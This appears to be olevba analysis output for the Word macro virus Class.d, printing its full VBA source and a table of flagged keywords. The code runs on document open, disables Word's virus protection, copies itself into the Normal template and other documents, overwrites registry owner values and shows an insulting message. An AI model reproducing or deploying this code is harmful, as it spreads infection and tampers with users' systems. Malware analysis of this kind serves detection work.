olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-3f96871c251cfe13ca62d73d555da784a5c40492
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-3f96871c251cfe13ca62d73d555da784a5c40492 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Armand O. C. Wendt16.11.01 23:48:44HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Armand O. C. Wendt16.11.01 23:48:44HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Armand O. C. Wendt16.11.01 23:48:44HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Const REG_SZ As Long = 1
'Armand O. C. Wendt16.11.01 23:48:44HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Armand O. C. Wendt16.11.01 23:48:44HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Sub AutoOpen()
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
On Error GoTo out
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Options.VirusProtection = False
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Options.SaveNormalPrompt = False
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Options.ConfirmConversions = False
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If nt > 70 And ad > 0 Then GoTo out
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If nt < 70 Then
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End If
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
With host.codemodule
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    For x = 1 To 16
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    .deletelines 1
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    Next x
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End With
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If nt < 70 Then
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    With host.codemodule
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    .replaceline 1, "Sub AutoClose()"
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    .replaceline 91, "Sub ToolsMacro()"
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    For x = 70 To 81
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
        .deletelines 62
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    Next x
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    .replaceline 35, "    For x = 1 To 4"
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    End With
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End If
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If nt < 70 Then
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
u = RegCloseKey(k)
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End If
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
With host.codemodule
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    For x = 2 To 104 Step 2
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
    Next x
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End With
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
out:
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End Sub
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
Sub ViewVBCode()
'Armand O. C. Wendt16.11.01 23:48:45HP OfficeJet Serie 600 Drucker on LPT1:Hauptseminar Roboter Navigation.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

